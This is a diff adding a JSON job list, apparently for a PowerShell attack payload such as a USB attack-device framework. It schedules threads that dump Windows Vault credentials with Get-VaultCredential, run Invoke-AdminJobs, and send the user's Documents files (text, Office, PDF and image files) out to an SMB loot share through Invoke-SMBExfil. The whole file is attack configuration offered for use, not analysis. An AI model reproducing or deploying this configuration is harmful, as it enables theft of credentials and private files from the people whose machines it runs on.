@@ -1,0 +1,18 @@
+[{
+    "jobName"   :"VaultCredential",
+    "command"   :"Get-VaultCredential | out-string",
+    "runType"   :"thread",
+    "scriptName":"Get-VaultCredential.ps1"
+},
+{
+    "jobName"   :"AdminJobs",
+    "command"   :"Invoke-AdminJobs",
+    "runType"   :"thread",
+    "scriptName":"Invoke-AdminJobs.ps1"
+},
+{
+    "jobName"   :"SMBExfil",
+    "command"   :"Invoke-SMBExfil \"$env:userprofile\\Documents\" $BB_SMBLOOT @(\"*.txt\",\"*.docx\",\"*.pdf\",\"*.jpg\",\"*.gif\",\"*.xlsx\")",
+    "runType"   :"thread",
+    "scriptName":"Invoke-SMBExfil.ps1"
+}]
